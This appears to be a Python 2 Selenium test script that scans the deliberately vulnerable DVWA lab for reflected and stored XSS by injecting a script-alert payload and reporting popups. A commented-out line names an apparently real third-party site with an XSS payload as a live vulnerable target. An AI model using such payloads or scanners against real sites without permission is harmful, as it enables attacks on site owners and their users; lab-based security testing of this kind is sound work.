# -*- coding: utf-8 -*-
from selenium import webdriver

from selenium.common.exceptions import NoSuchElementException
import unittest, time, re
import HTMLTestRunner
import time


''' 实现了针对DVWA漏洞平台的反射型XSS的检测，并生成测试报告 '''

class DVWA_XSS(unittest.TestCase):

	
	def init(self):
		'''useless'''
		self.driver = webdriver.Firefox()
		self.username = 'admin'
		self.password = 'password'
		self.baseUrl = 'http://localhost/dvwa/'
	

	
	def setUp(self):
		self.driver = webdriver.Firefox()
		self.driver.implicitly_wait(20)
		self.baseUrl = 'http://localhost/dvwa/'
		self.verificationErrors = []
		self.accept_next_alert = True

	
	def load(self,url):
		'''访问url'''
		self.driver.get(url)

	
	def XSS_reflected(self):
		u"""反射型XSS测试用例"""
		self.tailUrl = 'vulnerabilities/xss_r/'
		self.login()		
		self.setCookies()
		self.reflected_spider()

	def XSS_stored(self):
		u"""存储型XSS测试用例"""
		self.tailUrl = 'vulnerabilities/xss_s/'
		self.login()
		self.setCookies()
		self.stored_spider()

	
	def set_security(self,security):
		'''模拟点击元素设置安全度'''
		print 'ok!'		
		self.driver.find_element_by_link_text('DVWA Security').click()

		select = self.driver.find_element_by_name('security')
		select.find_element_by_xpath("//option[@value='low']").click()
		self.driver.find_element_by_name('seclev_submit').click()
		for cookie in self.driver.get_cookies():
			print '%s -> %s' % (cookie['name'],cookie['value'])
	
	def login(self):
		'''登陆'''
		driver = self.driver
		self.load(self.baseUrl)
	
		driver.find_element_by_name('username').clear()
		driver.find_element_by_name('username').send_keys('admin')
		driver.find_element_by_name('password').clear()
		driver.find_element_by_name('password').send_keys('password')
		#time.sleep(1)
		try:
			driver.find_element_by_name('Login').click()
			#print 'success login'

		except :
			pass
			#print 'failed login'	
    
	def setCookies(self):
		'''修改cookie'''		
		driver = self.driver
		#修改cookie
		driver.delete_cookie("security")
		driver.add_cookie({'name':'security','value':'low','path':'/dvwa/'+self.tailUrl})
		'''
		for cookie in driver.get_cookies():
			print '%s -> %s' % (cookie['name'],cookie['value'])
		
		time.sleep(1)
		'''
		url = self.baseUrl + self.tailUrl
		self.load(url)


	def reflected_spider(self):
		'''爬虫分析页面表单  反射型'''
		try:
		
			inputs = self.driver.find_elements_by_tag_name('input')
			xsscase = '</pre><script>alert("XSS")</script><pre>'
			for _input in inputs:
				if _input.get_attribute('type') == 'text':
					payload_name = _input.get_attribute('name')
					#print 'payload_name =',payload_name
					payload = '?'+payload_name+'='+xsscase
					injection_point = '//form/input/'
					time.sleep(1)
					self.load(self.baseUrl + self.tailUrl + payload)
					num,xss_dict=self.reflected_catch_alert(injection_point,xsscase)
					self.output_report(0,num,xss_dict)
					return 
		except :
			self.output_report(0,0,None)

	def stored_spider(self):
		'''爬虫分析页面表单  存储型'''
		try:
			forms = self.driver.find_elements_by_name('guestform')
			#print len(forms)
			payload = '</pre><script>alert("XSS")</script><pre>'
			for form in forms:
				form.find_element_by_xpath("//input[@type='text']").clear()
				form.find_element_by_xpath("//input[@type='text']").send_keys('test')
				form.find_element_by_xpath('//textarea').clear()
				form.find_element_by_xpath('//textarea').send_keys(payload)
				injection_point = '//form/textarea/'
				form.find_element_by_xpath("//input[@type='submit']").click()
				#self.driver.switch_to_alert().accept()
				#url = self.baseUrl + self.tailUrl
	    		#self.load(url)
	    		num,xss_dict=self.stored_catch_alert(injection_point,payload)
	    		self.output_report(1,num,xss_dict)
		except :
			self.output_report(1,0,None)
		



	def reflected_catch_alert(self,injection_point,xsscase):
		'''捕获alert弹框'''
		time.sleep(1)
		try:
			self.driver.switch_to_alert().accept()
			#print 'Reflected XSS vulnerability detected!'
			#print 'injection_point:',injection_point
			NUM_REFlECTED_XSS=0
			REFlECTED_XSS_INJECTION_dict={}
	
			REFlECTED_XSS_INJECTION_dict[injection_point]=xsscase
			NUM_REFlECTED_XSS += 1
			return NUM_REFlECTED_XSS,REFlECTED_XSS_INJECTION_dict
		except:
			#print "There isn't a Reflected XSS vulnerability!"
			#print 'injection_point:',injection_point
			return None

	def stored_catch_alert(self,injection_point,xsscase):
		'''捕获alert弹框'''
		time.sleep(1)
		try:
			self.driver.switch_to_alert().accept()
			#print 'Stored XSS vulnerability detected!'
			#print 'injection_point:',injection_point
			NUM_STROED_XSS=0
			STROED_XSS_INJECTION_dict={}
			STROED_XSS_INJECTION_dict[injection_point]=xsscase
			NUM_STROED_XSS += 1
			return NUM_STROED_XSS,STROED_XSS_INJECTION_dict
		except:
			#print "There isn't a Stored XSS vulnerability!"
			#print 'injection_point:',injection_point	
			return None



	def output_report(self,type,num,xss_dict):
		'''检测报告结论'''
		print u"\n\t\t\t\t检测结论："
		print "-----------------------------------------------------------------------------------"
		print u"  测试URL：\n",self.baseUrl
		print "-----------------------------------------------------------------------------------"
		
		if type == 0:
			if num == 0:
				print u"  该网页没有检测到反射型xss漏洞。"
			else:
				print u"  该网页检测到反射型xss漏洞:"
				for k,v in xss_dict.items():
					print u"注入点：",k
					print u"payload用例：",v
		else:


			if num == 0:
				print u"  该网页没有检测到存储型xss漏洞。"
			else:
				print u"  该网页检测到存储型xss漏洞:"
				for k,v in xss_dict.items():
					print u"注入点：",k
					print u"payload用例：",v

	


	def tearDown(self):
		self.driver.quit()
		self.assertEqual([], self.verificationErrors)
		


if __name__=='__main__':
	#xss_detection_brower = Browser()
	#实际有洞网站测试
	#url = 'http://www.digitalchina.com.hk/c/about_mgt_details.php?id=12094()"%26%25<acx><ScRiPt >alert('XSS');</ScRiPt>'	
	#xss_detection_brower.load_url_get(url)
	
	#定义一个单元测试容器
	testunit=unittest.TestSuite()
	#将测试用例加入到测试容器中
	testunit.addTest(DVWA_XSS("XSS_reflected"))
	testunit.addTest(DVWA_XSS("XSS_stored"))

	#定义个报告存放路径，支持相对路径
	now = time.strftime("%Y-%m-%M_%H-%M-%S",time.localtime(time.time()))
	filename = 'D:/PythonCode/XDT/report/'+now+'result.html'
	fp = file(filename, 'wb')
	#定义测试报告
	runner =HTMLTestRunner.HTMLTestRunner(
	stream=fp,
	title=u'XSS测试报告',
	description=u'用例执行情况：')
	#运行测试用例
	runner.run(testunit)
